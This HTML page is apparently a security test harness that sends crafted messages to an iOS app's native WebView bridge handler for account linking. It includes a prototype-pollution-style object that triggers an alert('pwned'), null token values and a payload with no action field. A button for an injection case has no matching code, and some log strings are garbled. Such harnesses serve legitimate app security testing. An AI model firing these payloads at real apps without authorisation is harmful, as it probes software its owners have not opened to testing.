<!-- <!DOCTYPE html>
<html>
<head><title>Test JS Bridge</title></head>
<body>
  <h1>Testing JS Bridges</h1>
  <button onclick="sendMessages()">Send Messages to Native</button>

  <script>
    function sendMessages() {
      try {
        // window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage("Hello from JS");
        // window.webkit.messageHandlers.pinmarkletNoResultsHandler.postMessage("No results test");
        window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({action: ""});
        // window.webkit.messageHandlers.AmazonShopExternalInterfaceHandler.postMessage("Amazon searchTerm");
        // window.webkit.messageHandlers.PinImageOffScreenDetectionHandler.postMessage({status: "offscreen"});
        alert("Messages sent to native handlers!");
      } catch (e) {
        alert("Error sending message: " + e.message);
      }
    }
  </script>
</body>
</html> -->






<!DOCTYPE html>
<html>
<head>
  <title>Test TargetAccountLinkingInterfaceHandler Payloads</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; }
    button { margin: 10px 0; padding: 10px 15px; font-size: 16px; display: block; }
    #log { background: #fff; padding: 10px; border: 1px solid #ccc; margin-top: 20px; }
  </style>
</head>
<body>

  <h2>Test TargetAccountLinkingInterfaceHandler</h2>

  <button onclick="sendPayload(1)">1. OAuth-style payload (facebook)</button>
  <button onclick="sendPayload(2)">2. Injection in accountId</button>
  <button onclick="sendPayload(3)">3. Fake __proto__ crash test</button>
  <button onclick="sendPayload(4)">4. Payload without 'action'</button>

  <div id="log"></div>

  <script>
    function sendPayload(type) {
      let payload;

      switch (type) {
        case 1:
          payload = {
            action: "linkAccount",
            provider: "null",
            accessToken: "null"
          };
          break;

      

        case 3:
          payload = {
            action: "linkAccount",
            accountId: {
              hack: "__proto__",
              toString: function () {
                alert("pwned");
                return "1337";
              }
            }
          };
          break;

        case 4:
          payload = {
            provider: "google",
            token: "abcdef"
          };
          break;

        default:
          alert("Unknown payload type");
          return;
      }

      try {
        window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage(payload);
        log(`‚úÖ Sent payload ${type}: ${JSON.stringify(payload)}`);
      } catch (e) {
        log(`‚ùå Error sending payload ${type}: ${e.message}`);
      }
    }

    function log(message) {
      const logDiv = document.getElementById("log");
      logDiv.innerHTML += `<div>üü° ${message}</div>`;
    }
  </script>

</body>
</html>
